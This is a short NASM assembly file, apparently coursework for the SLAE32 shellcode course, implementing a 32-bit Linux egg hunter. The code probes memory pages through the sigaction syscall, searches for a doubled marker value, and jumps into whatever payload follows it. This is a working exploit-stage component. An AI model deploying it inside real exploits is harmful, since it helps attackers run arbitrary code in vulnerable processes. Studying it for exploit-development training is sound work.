; Egghunter.nasm 
; Author: Ian McLachlan
; SLAE32 - Assignment 3 Egg Hunter


global _start

section .text

_start:

	mov ebx, 0x50905090

pagesetup:
	or cx,0xfff
	inc ecx

incpage:

	
	inc ecx		
	push byte +0x43
	pop eax
	int 0x80
	cmp al,0xf2
	jz pagesetup
				
	mov eax, ebx
	mov edi, ecx
	scasd
	jnz incpage
	scasd
	jnz incpage	
	jmp edi
